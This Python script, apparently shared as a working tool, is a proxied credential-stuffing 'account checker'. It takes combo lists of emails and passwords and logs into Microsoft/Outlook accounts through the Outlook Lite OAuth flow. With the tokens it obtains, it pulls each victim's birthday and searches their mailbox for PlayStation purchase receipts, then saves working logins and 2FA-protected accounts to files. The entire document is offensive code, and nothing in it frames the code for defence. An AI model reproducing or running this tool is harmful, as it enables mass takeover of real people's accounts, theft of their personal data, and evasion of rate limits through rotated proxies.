import requests
import json
import uuid
import re
import time
import os
import random
from datetime import datetime
from pathlib import Path
from threading import Lock
from concurrent.futures import ThreadPoolExecutor

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BRIGHT_GREEN = '\033[1;92m'
    BRIGHT_YELLOW = '\033[1;93m'
    BRIGHT_BLUE = '\033[1;94m'
    BRIGHT_CYAN = '\033[1;96m'
    DIM = '\033[2m'
    END = '\033[0m'

# قائمة ل تخزين البروكسيات المحملة
PROXIES_LIST = []

def load_proxies():
    global PROXIES_LIST
    proxy_file = "proxies.txt"
    if not os.path.exists(proxy_file):
        return False
    
    with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            
            # تنسيق البروكسي ل يتوافق مع مكتبة requests
            proxy_formatted = line
            if "://" not in proxy_formatted:
                parts = proxy_formatted.split(":")
                if len(parts) == 4:
                    # صيغة IP:Port:User:Pass
                    ip, port, user, pwd = parts
                    proxy_formatted = f"http://{user}:{pwd}@{ip}:{port}"
                elif len(parts) == 2:
                    # صيغة IP:Port العادية
                    proxy_formatted = f"http://{proxy_formatted}"
            
            PROXIES_LIST.append({
                "http": proxy_formatted,
                "https": proxy_formatted
            })
    return len(PROXIES_LIST) > 0

def get_random_proxy():
    if not PROXIES_LIST:
        return None
    return random.choice(PROXIES_LIST)

class PSNChecker:
    def __init__(self, debug=False):
        self.session = requests.Session()
        proxy = get_random_proxy()
        if proxy:
            self.session.proxies.update(proxy)
            
        self.uuid = str(uuid.uuid4())
        self.debug = debug
        
    def log(self, message):
        if self.debug:
            print(f'{Colors.DIM}[DEBUG] {message}{Colors.END}')
            
    def check(self, email, password):
        try:
            self.log(f'Checking: {email}')
            url1 = f'https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}'
            headers1 = {'X-OneAuth-AppName': 'Outlook Lite', 'X-Office-Version': '3.11.0-minApi24', 'X-CorrelationId': self.uuid, 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)', 'Host': 'odc.officeapps.live.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
            r1 = self.session.get(url1, headers=headers1, timeout=15)
            if 'Neither' in r1.text or 'Both' in r1.text or 'Placeholder' in r1.text or ('OrgId' in r1.text):
                return {'status': 'BAD', 'reason': 'Not a valid Hotmail/Outlook account'}
            else:
                if 'MSAccount' not in r1.text:
                    return {'status': 'BAD', 'reason': 'Not a Microsoft account'}
                else:
                    time.sleep(0.3)
                    url2 = f'https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D'
                    headers2 = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'keep-alive'}
                    r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
                    url_match = re.search(r'urlPost\":\"([^\"]+)\"', r2.text)
                    ppft_match = re.search(r'name=\\\\\"PPFT\\\\\" id=\\\\\"i0327\\\\\" value=\\\\\"([^\"]+)\"', r2.text)
                    if not url_match or not ppft_match:
                        self.log('Could not find PPFT or urlPost')
                        return {'status': 'BAD', 'reason': 'Login page parse error'}
                    else:
                        post_url = url_match.group(1).replace('\\/', '/')
                        ppft = ppft_match.group(1)
                        self.log(f'PPFT found, posting to: {post_url[:50]}...')
                        login_data = f'i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960'
                        headers3 = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Origin': 'https://login.live.com', 'Referer': r2.url}
                        r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
                        response_text = r3.text.lower()
                        if 'account or password is incorrect' in response_text or r3.text.count('error') > 0:
                            return {'status': 'BAD', 'reason': 'Invalid credentials'}
                        else:
                            if 'https://account.live.com/identity/confirm' in r3.text or 'identity/confirm' in response_text:
                                return {'status': '2FA'}
                            else:
                                if 'https://account.live.com/Consent' in r3.text or 'consent' in response_text:
                                    return {'status': '2FA'}
                                else:
                                    if 'https://account.live.com/Abuse' in r3.text:
                                        return {'status': 'BAD', 'reason': 'Account suspended'}
                                    else:
                                        location = r3.headers.get('Location', '')
                                        if not location:
                                            self.log('No Location header')
                                            return {'status': 'BAD', 'reason': 'No redirect'}
                                        else:
                                            code_match = re.search(r'code=([^&]+)', location)
                                            if not code_match:
                                                self.log('No auth code in redirect')
                                                return {'status': 'BAD', 'reason': 'No auth code'}
                                            else:
                                                code = code_match.group(1)
                                                mspcid = self.session.cookies.get('MSPCID', '')
                                                if not mspcid:
                                                    self.log('No MSPCID cookie')
                                                    return {'status': 'BAD', 'reason': 'No CID'}
                                                else:
                                                    cid = mspcid.upper()
                                                    self.log(f'CID: {cid}')
                                                    token_data = f'client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access'
                                                    r4 = self.session.post('https://login.microsoftonline.com/consumers/oauth2/v2.0/token', data=token_data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, timeout=15)
                                                    if 'access_token' not in r4.text:
                                                        self.log('No access token in response')
                                                        return {'status': 'BAD', 'reason': 'Token error'}
                                                    else:
                                                        token_json = r4.json()
                                                        access_token = token_json['access_token']
                                                        self.log('✓ Access token obtained, checking PSN...')
                                                        birthday_result = self.get_birthday(email, access_token, cid)
                                                        psn_result = self.check_psn(email, access_token, cid)
                                                        result = {'status': 'HIT', 'email': email, 'password': password, 'birthday': birthday_result.get('birthday', 'Unknown'), 'age': birthday_result.get('age', 'Unknown'), 'psn_status': psn_result.get('psn_status', 'FREE'), 'psn_orders': psn_result.get('psn_orders', 0), 'psn_purchases': psn_result.get('purchases', [])}
                                                        return result
        except requests.Timeout:
            return {'status': 'BAD', 'reason': 'Timeout'}
        except Exception as e:
            self.log(f'Exception: {str(e)}')
            return {'status': 'BAD', 'reason': 'Error'}
            
    def get_birthday(self, email, access_token, cid):
        self.log('Getting birthday info...')
        try:
            graph_headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}'}
            profile_url = 'https://substrate.office.com/profileb2/v2.0/me/V1Profile'
            r = self.session.get(profile_url, headers=graph_headers, timeout=15)
            if r.status_code == 200:
                profile_data = r.json()
                birthday = None
                for field in ['birthday', 'birthDate', 'dateOfBirth']:
                    if field in profile_data:
                        birthday = profile_data[field]
                        break
                if not birthday and 'personalInfo' in profile_data:
                    for field in ['birthday', 'birthDate']:
                        if field in profile_data['personalInfo']:
                            birthday = profile_data['personalInfo'][field]
                            break
                if birthday:
                    for date_format in ['%Y-%m-%d', '%m/%d/%Y', '%d/%m/%Y', '%Y-%m-%dT%H:%M:%S']:
                        try:
                            birth_date = datetime.strptime(str(birthday).split('T')[0], date_format.split('T')[0])
                            today = datetime.now()
                            age = today.year - birth_date.year - ((today.month, today.day) < (birth_date.month, birth_date.day))
                            return {'birthday': birth_date.strftime('%Y-%m-%d'), 'age': age}
                        except:
                            continue
                    return {'birthday': str(birthday), 'age': 'Unknown'}
        except Exception as e:
            self.log(f'Birthday check error: {str(e)}')
        return {'birthday': 'Unknown', 'age': 'Unknown'}

    def check_psn(self, email, access_token, cid):
        self.log('Searching PlayStation emails...')
        try:
            search_url = 'https://outlook.live.com/search/api/v2/query'
            payload = {'Cvid': str(uuid.uuid4()), 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'UTC', 'TextDecorations': 'Off', 'EntityRequests': [{'EntityType': 'Conversation', 'ContentSources': ['Exchange'], 'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}]}, 'From': 0, 'Query': {'QueryString': 'sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number'}, 'Size': 50, 'Sort': [{'Field': 'Time', 'SortDirection': 'Desc'}]}]}
            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
            r = self.session.post(search_url, json=payload, headers=headers, timeout=15)
            if r.status_code == 200:
                data = r.json()
                purchases = []
                total_orders = 0
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total_orders = result_set.get('Total', 0)
                        if 'Results' in result_set:
                            for result in result_set['Results'][:15]:
                                purchase_info = {}
                                preview = result.get('Preview', '')
                                full_text = result.get('ItemBody', {}).get('Content', preview)
                                game_patterns = [r'Thank you for purchasing\s+([^\.]+?)(?:\s+from|\.|$)', r'You\'ve bought\s+([^\.]+?)(?:\s+from|\.|$)', r'Order.*?\:\s*([A-Z][^\n\.]{5,60}?)(?:\s+has|\s+is|\s+for|\.|$)', r'purchased\s+([^\.]{5,60}?)\s+(?:for|from)']
                                for pattern in game_patterns:
                                    match = re.search(pattern, full_text, re.IGNORECASE)
                                    if match:
                                        item_name = re.sub(r'\s+', ' ', match.group(1)).strip().replace('\\r', '').replace('\\n', '')
                                        if 5 < len(item_name) < 100:
                                            purchase_info['item'] = item_name
                                            break
                                if not purchase_info.get('item') and 'Subject' in result:
                                    for pattern in [r'Your PlayStation.*?purchase.*?\:\s*([^\|]+)', r'Receipt.*?\:\s*([^\|]+)']:
                                        match = re.search(pattern, result['Subject'], re.IGNORECASE)
                                        if match:
                                            purchase_info['item'] = match.group(1).strip()
                                            break
                                for pattern in [r'(?:Total|Amount|Price)[\s:][\$€£¥]\s*(\d+[\.,]\d{2})', r'[\$€£¥]\s*(\d+[\.,]\d{2})']:
                                    price_match = re.search(pattern, full_text)
                                    if price_match:
                                        purchase_info['price'] = price_match.group(0)
                                        break
                                if 'ReceivedTime' in result:
                                    try:
                                        date_obj = datetime.fromisoformat(result['ReceivedTime'].replace('Z', '+00:00'))
                                        purchase_info['date'] = date_obj.strftime('%Y-%m-%d')
                                    except:
                                        pass
                                if purchase_info.get('item'):
                                    purchases.append(purchase_info)
                if total_orders > 0:
                    return {'psn_status': 'HAS_ORDERS', 'psn_orders': total_orders, 'purchases': purchases}
        except Exception as e:
            self.log(f'PSN check error: {str(e)}')
        return {'psn_status': 'FREE', 'psn_orders': 0, 'purchases': []}

class ResultManager:
    def __init__(self, combo_name):
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.base_folder = Path(f'PSN_Results_{combo_name}_{timestamp}')
        self.base_folder.mkdir(exist_ok=True)
        self.hits_file = self.base_folder / 'hits.txt'
        self.psn_hits = self.base_folder / 'psn_hits.txt'
        self.hits_detailed = self.base_folder / 'hits_detailed.txt'
        self.twofa_file = self.base_folder / '2fa.txt'
        self.lock = Lock()
        
    def save_hit(self, email, password, result):
        with self.lock:
            with open(self.hits_file, 'a', encoding='utf-8') as f:
                f.write(f'{email}:{password}\n')
            if result.get('psn_orders', 0) > 0:
                with open(self.psn_hits, 'a', encoding='utf-8') as f:
                    hit_line = f"{email}:{password} | Orders: {result['psn_orders']}"
                    birthday = result.get('birthday', 'Unknown')
                    age = result.get('age', 'Unknown')
                    if birthday != 'Unknown':
                        hit_line += f' | Birthday: {birthday}'
                        if age != 'Unknown':
                            hit_line += f' (Age: {age})'
                    f.write(hit_line + '\n')
            with open(self.hits_detailed, 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*70}\n")
                f.write(f'Email: {email}\nPassword: {password}\n')
                birthday = result.get('birthday', 'Unknown')
                age = result.get('age', 'Unknown')
                if birthday != 'Unknown':
                    f.write(f'Birthday: {birthday}')
                    if age != 'Unknown':
                        f.write(f' (Age: {age})')
                    f.write('\n')
                f.write(f"PSN Status: {result.get('psn_status', 'FREE')}\nTotal Orders: {result.get('psn_orders', 0)}\n")
                purchases = result.get('psn_purchases', [])
                if purchases:
                    f.write('\nPurchases:\n')
                    for i, p in enumerate(purchases, 1):
                        f.write(f"  {i}. {p.get('item', 'Unknown')}\n")
                        if p.get('price'): f.write(f"     Price: {p['price']}\n")
                        if p.get('date'): f.write(f"     Date: {p['date']}\n")
                f.write(f"{'='*70}\n")
                
    def save_2fa(self, email, password):
        with self.lock:
            with open(self.twofa_file, 'a', encoding='utf-8') as f:
                f.write(f'{email}:{password}\n')

class LiveStats:
    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.hits = 0
        self.psn_hits = 0
        self.two_fa = 0
        self.bads = 0
        self.lock = Lock()
        self.start_time = time.time()
        
    def update(self, status, result=None):
        with self.lock:
            self.checked += 1
            if status == 'HIT':
                self.hits += 1
                if result and result.get('psn_orders', 0) > 0: self.psn_hits += 1
            elif status == '2FA':
                self.two_fa += 1
            else:
                self.bads += 1
                
    def print_live(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            cpm = (self.checked / elapsed * 60) if elapsed > 0 else 0
            progress = (self.checked / self.total * 100) if self.total > 0 else 0
            bar_length = 30
            filled = int(bar_length * progress / 100)
            bar = '█' * filled + '░' * (bar_length - filled)
            print(f'\r{Colors.CYAN}[{bar}] {progress:.1f}%{Colors.END} | {Colors.BRIGHT_GREEN}✓{self.hits} {Colors.BRIGHT_BLUE}PSN:{self.psn_hits} {Colors.YELLOW}2FA:{self.two_fa} {Colors.RED}✗{self.bads}{Colors.END} {Colors.BRIGHT_YELLOW}({cpm:.0f} CPM){Colors.END}', end='', flush=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(f'\n{Colors.BRIGHT_BLUE}    ____  _____ _   __   _    _____ \n{Colors.BRIGHT_CYAN}   / __ \\/ ___// | / /  | |  / /   |\n{Colors.BRIGHT_BLUE}  / /_/ /\\__ \\/  |/ /   | | / / /| |\n{Colors.BRIGHT_CYAN} / ____/___/ / /|  /    | |/ / ___ |\n{Colors.BRIGHT_BLUE}/_/    /____/_/ |_/     |___/_/  |_|\n{Colors.BRIGHT_GREEN} ╔══════════════════════════════════════════╗\n ║  {Colors.WHITE}PSN V1 - Account Checker (Proxied)      {Colors.BRIGHT_GREEN}║\n ╚══════════════════════════════════════════╝{Colors.END}\n')

if __name__ == '__main__':
    try:
        while True:
            clear()
            banner()
            
            # تحميل البروكسيات تلقائياً
            if load_proxies():
                print(f"{Colors.BRIGHT_GREEN}[+] Loaded {len(PROXIES_LIST)} Proxies from proxies.txt{Colors.END}\n")
            else:
                print(f"{Colors.RED}[!] Warning: proxies.txt not found or empty! Running without proxy.{Colors.END}\n")
                
            print(f'{Colors.CYAN}1.{Colors.END} Start Check')
            print(f'{Colors.CYAN}2.{Colors.END} Exit\n')
            choice = input(f'{Colors.BRIGHT_YELLOW}Choice:{Colors.END} ').strip()
            
            if choice == '2':
                break
            elif choice == '1':
                combo_file = input(f'\n{Colors.BRIGHT_YELLOW}Combo file name (e.g. here.txt):{Colors.END} ').strip()
                if not os.path.exists(combo_file):
                    print(f'{Colors.RED}✗ File not found!{Colors.END}')
                    input(f'\n{Colors.CYAN}Press Enter...{Colors.END}')
                    continue
                    
                with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [l.strip() for l in f if l.strip() and ':' in l]
                if not lines:
                    print(f'{Colors.RED}✗ No valid combos!{Colors.END}')
                    input(f'\n{Colors.CYAN}Press Enter...{Colors.END}')
                    continue
                    
                threads = int(input(f'\n{Colors.BRIGHT_YELLOW}Threads (Recommended 5-10):{Colors.END} ').strip() or "5")
                clear()
                banner()
                print(f'{Colors.BRIGHT_GREEN}Starting check with proxies...{Colors.END}')
                print(f'Combos: {len(lines)} | Threads: {threads}\n')
                
                combo_name = os.path.basename(combo_file).replace('.txt', '')
                result_mgr = ResultManager(combo_name)
                stats = LiveStats(len(lines))
                
                def process(line):
                    try:
                        parts = line.split(':', 1)
                        if len(parts) != 2:
                            stats.update('BAD')
                            stats.print_live()
                            return
                        email, password = parts[0].strip(), parts[1].strip()
                        checker = PSNChecker(debug=False)
                        result = checker.check(email, password)
                        stats.update(result['status'], result if result['status'] == 'HIT' else None)
                        
                        if result['status'] == 'HIT':
                            orders = result.get('psn_orders', 0)
                            birthday = result.get('birthday', 'Unknown')
                            age = result.get('age', 'Unknown')
                            output_parts = [f'\n{Colors.BRIGHT_GREEN}✓ {email[:30]}{Colors.END}']
                            if birthday != 'Unknown':
                                output_parts.append(f'{Colors.MAGENTA}🎂{birthday}({age}y){Colors.END}')
                            if orders > 0:
                                purchases = result.get('psn_purchases', [])
                                item = purchases[0]['item'][:20] if purchases and purchases[0].get('item') else 'N/A'
                                output_parts.append(f'{Colors.BRIGHT_BLUE}PSN orders:{orders}({item}){Colors.END}')
                            else:
                                output_parts.append(f'{Colors.WHITE}PSN:FREE{Colors.END}')
                            print(' '.join(output_parts))
                            result_mgr.save_hit(email, password, result)
                        elif result['status'] == '2FA':
                            print(f'\n{Colors.YELLOW}🔐 2FA: {email[:30]}{Colors.END}')
                            result_mgr.save_2fa(email, password)
                        stats.print_live()
                    except:
                        stats.update('BAD')
                        stats.print_live()

                with ThreadPoolExecutor(max_workers=threads) as executor:
                    executor.map(process, lines)
                    
                print(f"\n\n{Colors.BRIGHT_CYAN}{'='*60}{Colors.END}")
                print(f'{Colors.BRIGHT_YELLOW}RESULTS SUMMARY:{Colors.END}')
                print(f'  {Colors.BRIGHT_GREEN}✓ Hits: {stats.hits}{Colors.END}')
                print(f'  {Colors.BRIGHT_BLUE}🎯 PSN Orders Found: {stats.psn_hits}{Colors.END}')
                print(f'  {Colors.YELLOW}🔐 2FA: {stats.two_fa}{Colors.END}')
                print(f'  {Colors.RED}✗ Bad: {stats.bads}{Colors.END}')
                print(f"{Colors.BRIGHT_CYAN}{'='*60}{Colors.END}")
                print(f'\n{Colors.BRIGHT_GREEN}✓ Saved to folder: {result_mgr.base_folder}{Colors.END}')
                input(f'\n{Colors.CYAN}Press Enter to continue...{Colors.END}')
                
    except KeyboardInterrupt:
        print(f'\n\n{Colors.YELLOW}Stopped by user!{Colors.END}\n')
    except Exception as e:
        print(f'\n{Colors.RED}Error: {str(e)}{Colors.END}')
